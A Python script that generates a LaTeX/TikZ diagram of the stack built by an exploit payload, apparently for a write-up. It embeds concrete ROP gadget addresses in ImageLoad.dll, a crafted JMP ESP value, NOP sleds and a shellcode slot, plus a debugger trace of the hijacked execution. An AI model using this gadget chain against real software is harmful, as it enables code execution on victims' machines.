import os

OUTPUT_PATH="input"

stack_base = \
"""
\\begin{{figure}}[!h]
%  \\centering
\\hspace{{5.0cm}}
  \\begin{{tikzpicture}}
{}
  \\end{{tikzpicture}}
  \\caption{{Representation of the stack created by the payload.}}
\\end{{figure}}
"""

def tt(text):
    return "\\texttt{{{}}}".format(text)

def vdots():
    return "\\vdots"


elements =  [
    "90 x NOP",
    "0x1001D8C8 ; call\_edx",
    "280 x NOP",
    "0x10010101 ; ppr",
    "0xA445ABCF ; crafted\_jmp\_esp" ,
    "0x10010125 ; kungfu",
    "0x10022aac ; kungfu", # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
    "0xDEADBEEF ; kungfu", # filler
    "0xDEADBEEF ; kungfu", # filler
    "0x1001a187 ; kungfu", # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
    "0x1002466d ; kungfu", # PUSH EAX # RETN [ImageLoad.dll]
    "90 x NOP",
    "shellcode",
]

exploit_instructions = [l.strip() for l in """
00468702 000006E0 CALL DWORD PTR DS:[EDX+28]
1001D87A 000006E0 MOV EDI,DWORD PTR SS:[ESP+264]            ; EDI=10010125
1001D881 000006E0 MOV BL,BYTE PTR DS:[EDI]
1001D883 000006E0 INC EDI                                   ; EDI=10010126
1001D884 000006E0 TEST BL,BL
1001D886 000006E0 MOV BYTE PTR SS:[ESP+40],BL
1001D88A 000006E0 MOV DWORD PTR SS:[ESP+264],EDI
1001D891 000006E0 JNZ ImageLoa.1001D075
1001D897 000006E0 MOV EAX,DWORD PTR SS:[ESP+1C]             ; EAX=00182180
1001D89B 000006E0 POP EDI                                   ; EDI=00468705
1001D89C 000006E0 POP ESI                                   ; ESI=00000000
1001D89D 000006E0 POP EBP                                   ; EBP=00000000
1001D89E 000006E0 POP EBX                                   ; EBX=0257EF70
1001D89F 000006E0 ADD ESP,24C
1001D8A5 000006E0 RETN
10010101 000006E0 POP EBX                                   ; EBX=A445ABCF
10010102 000006E0 POP ECX                                   ; ECX=10010126
10010103 000006E0 RETN
10022AAC 000006E0 MOV EAX,EBX                               ; EAX=A445ABCF
10022AAE 000006E0 POP ESI                                   ; ESI=DEADBEEF
10022AAF 000006E0 POP EBX                                   ; EBX=DEADBEEF
10022AB0 000006E0 RETN
    Breakpoint at ImageLoa.1001A187
1001A187 000006E0 ADD EAX,5BFFC883                          ; EAX=00457452
1001A18C 000006E0 RETN
1002466D 000006E0 PUSH EAX
1002466E 000006E0 RETN
00457452 000006E0 JMP ESP
03B69A0C 000006E0 NOP
03B69A0D 000006E0 NOP
03B69A0E 000006E0 NOP
03B69A0F 000006E0 NOP
03B69A10 000006E0 NOP
03B69A11 000006E0 NOP
03B69A12 000006E0 NOP
03B69A13 000006E0 NOP
03B69A14 000006E0 NOP
03B69A15 000006E0 NOP
03B69A16 000006E0 NOP
03B69A17 000006E0 NOP
03B69A18 000006E0 NOP
03B69A19 000006E0 NOP
03B69A1A 000006E0 NOP
""".splitlines() if l.strip()]

current_x = 0.0
current_y = 0.0

rect_width = 3.0
rect_height = 0.5
comment_offset = 0.5

internal_code_buffer = []

fmt_draw_rect = "    \\draw ({:.4},{:.4}) rectangle ({:.4},{:.4});"
fmt_text_node = "    \\node at ({:.4},{:.4}) {{{}}};"
fmt_text_node_comment = "    \\node[anchor=west] at ({:.4},{:.4}) {{{}}};"

for elem in reversed(elements):

    x1 = current_x
    y1 = current_y
    x2 = x1+rect_width
    y2 = y1+rect_height

    internal_code_buffer.append(fmt_draw_rect.format(x1,y1,x2,y2))

    tx = (x2-x1)/2
    ty = current_y+((y2-y1)/2)

    comment=""
    if ';' in elem: # Comment present.
        elem, comment = [e.strip() for e in elem.split(';')]

    code = fmt_text_node.format(tx, ty, tt(elem))
    internal_code_buffer.append(code)

    if comment:
        cx = tx + rect_width/2 + comment_offset
        cy = ty
        comment = fmt_text_node_comment.format(cx, cy, "; "+comment)
        internal_code_buffer.append(comment)

    current_y += rect_height

if not os.path.isdir(OUTPUT_PATH):
    os.mkdir(OUTPUT_PATH)

with open(os.path.join(OUTPUT_PATH, 'stack_before.tex'), 'w') as fp:
    fp.write(stack_base.format('\n'.join(internal_code_buffer))+"\n")

print(exploit_instructions)
